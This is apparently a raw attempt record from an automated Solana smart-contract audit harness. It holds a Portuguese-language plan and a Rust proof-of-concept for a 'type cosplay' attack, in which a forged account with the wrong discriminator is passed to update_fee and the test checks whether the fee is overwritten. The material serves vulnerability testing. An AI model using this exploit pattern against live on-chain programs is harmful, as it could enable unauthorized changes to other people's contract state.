attempts.raw:
{
  "plan": "O ataque COSPLAY explora a ausencia de validacao de discriminador na instrucao update_fee. O cenario monta uma conta 'config' legitima com o discriminador esperado e uma conta 'fake' de outro tipo cujo layout em 8..40 contem a pubkey da authority. O baseline chama update_fee com a config legitima e a authority como signer, provando que o cenario esta correto. O ataque chama update_fee com a conta fake no lugar da config, mantendo a mesma authority signer; se o programa aceitar, o fee sera escrito na conta fake, demonstrando que uma conta de tipo incorreto foi aceita.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

// Conta config legitima: discriminador esperado + admin (authority) + fee inicial
let mut config_data = vec![0u8; 48];
config_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);
config_data[8..40].copy_from_slice(authority.as_ref());
config_data[40..48].copy_from_slice(&100u64.to_le_bytes());
let config = account(&env.program_id, &config_data, None);

// Conta fake de outro tipo: discriminador diferente, mas bytes 8..40 = authority
let mut fake_data = vec![0u8; 48];
fake_data[0..8].copy_from_slice(&[0x05, 0xE7, 0xDA, 0x7A, 0x00, 0x00, 0x00, 0x02]);
fake_data[8..40].copy_from_slice(authority.as_ref());
fake_data[40..48].copy_from_slice(&999u64.to_le_bytes());
let fake = account(&env.program_id, &fake_data, None);

let authority_acc = wallet(1_000_000_000);

// Baseline: uso legitimo com a config correta
let ix_legit = env.raw_ix(&(0u8, 500u64), &[
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(authority, true),
]);
let r_base = env.baseline("update_fee legitimo com config correta", &ix_legit, &[
    (config_key, config.clone()),
    (authority, authority_acc.clone()),
]);

// Ataque: mesma chamada, mas com a conta fake no lugar da config
let ix_attack = env.raw_ix(&(0u8, 777u64), &[
    AccountMeta::new(fake_key, false),
    AccountMeta::new_readonly(authority, true),
]);
let r = env.attack("update_fee com conta de tipo incorreto (cosplay)", &ix_attack, &[
    (fake_key, fake.clone()),
    (authority, authority_acc.clone()),
]);

if r.program_result == ProgramResult::Success {
    let fake_after = after(&r, &fake_key);
    env.effect("fee escrito na conta de tipo incorreto", read_u64(fake_after.data(), 40) == 777);
}"
}

